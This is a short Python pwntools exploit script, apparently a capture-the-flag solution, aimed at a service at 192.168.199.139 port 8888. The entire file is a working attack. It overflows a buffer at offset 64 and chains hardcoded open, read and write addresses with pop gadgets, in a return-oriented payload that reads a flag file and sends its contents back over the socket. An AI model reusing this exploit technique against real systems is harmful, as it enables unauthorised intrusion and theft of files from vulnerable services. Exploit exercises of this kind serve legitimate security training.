from pwn import *

eip_offset = 64
open = 0xb7f00060
read = 0xb7f004f0
write_buf = 0x804889c

pop2ret = 0x8048ef7
pop3ret = 0x8048ef6

flag = 0x8049128

buf = 0x804a000
buf_len = 0x100

flag_fd = 0x3
sock_fd = 0x4

payload = 'A' * eip_offset
payload += struct.pack('IIII', open, pop2ret, flag, 0x0)
payload += struct.pack('IIIII', read, pop3ret, flag_fd, buf, buf_len)
payload += struct.pack('IIII', write_buf, 0xdeadbeef, sock_fd, buf)

r = remote('192.168.199.139', 8888)

r.recvuntil('> ')
r.send('store\n')

r.recvuntil('> ')
r.send('%d\n' % (len(payload) + 1))

r.recvuntil('> ')
r.send(payload + '\n')

r.recvuntil('> ')
r.send(payload)

print r.recvline()
